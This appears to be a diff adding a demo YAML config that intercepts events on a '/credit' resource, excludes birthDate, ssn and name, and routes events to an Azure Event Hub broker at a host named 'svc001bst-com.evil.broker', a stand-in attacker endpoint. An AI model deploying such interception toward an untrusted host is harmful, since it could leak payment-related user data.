@@ -1,0 +1,16 @@
+# Only Demo purpose
+interceptor-rules:
+  - event: "ForsakenCart.class"
+    resource: "/credit"
+    exclude-fields:
+      - birthDate
+      - ssn
+      - name
+    rules:
+      method: POST
+      request: false
+      response: false
+---
+broker:
+  kind: azure-eventhub
+  host: svc001bst-com.evil.broker
